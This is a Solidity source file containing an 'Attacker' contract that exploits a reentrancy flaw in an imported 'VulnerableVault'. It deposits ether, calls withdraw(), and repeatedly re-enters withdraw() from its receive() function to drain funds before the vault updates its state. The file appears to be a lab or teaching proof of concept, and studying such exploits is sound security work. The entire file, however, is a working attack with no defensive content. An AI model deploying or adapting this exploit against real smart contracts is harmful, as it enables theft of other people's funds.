// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./VulnerableVault.sol";

contract Attacker {
    VulnerableVault public vault;
    uint256 public reenterCount;
    uint256 public target; // how many times to re-enter

    constructor(VulnerableVault _vault) {
        vault = _vault;
    }

    // fund this attack with some ETH; we deposit 1 ether then start withdrawing
    function attack(uint256 _target) external payable {
        require(msg.value >= 1 ether, "need seed");
        target = _target;

        vault.deposit{value: 1 ether}();
        vault.withdraw(); // kicks off the first payout; re-entry happens in receive()
    }

    // Re-enters until we hit the target count
    receive() external payable {
        if (reenterCount < target) {
            reenterCount++;
            vault.withdraw(); // re-enter before the first call has finished (because state isn't updated yet)
        }
    }
}
